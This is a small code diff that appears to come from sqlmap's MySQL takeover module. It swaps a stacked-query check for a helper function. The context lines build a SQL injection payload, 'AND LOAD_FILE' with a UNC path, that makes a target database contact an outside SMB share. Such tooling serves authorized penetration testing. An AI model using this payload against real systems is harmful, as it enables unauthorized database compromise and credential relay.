@@ -9,6 +9,7 @@ import re
 
 from lib.core.agent import agent
 from lib.core.common import Backend
+from lib.core.common import isStackingAvailable
 from lib.core.common import isTechniqueAvailable
 from lib.core.common import normalizePath
 from lib.core.common import ntToPosixSlashes
@@ -100,7 +101,7 @@ class Takeover(GenericTakeover):
             logger.debug("keeping existing UDF '%s' as requested" % udf)
 
     def uncPathRequest(self):
-        if not isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED):
+        if not isStackingAvailable():
             query = agent.prefixQuery("AND LOAD_FILE('%s')" % self.uncPath)
             query = agent.suffixQuery(query)
             payload = agent.payload(newValue=query)
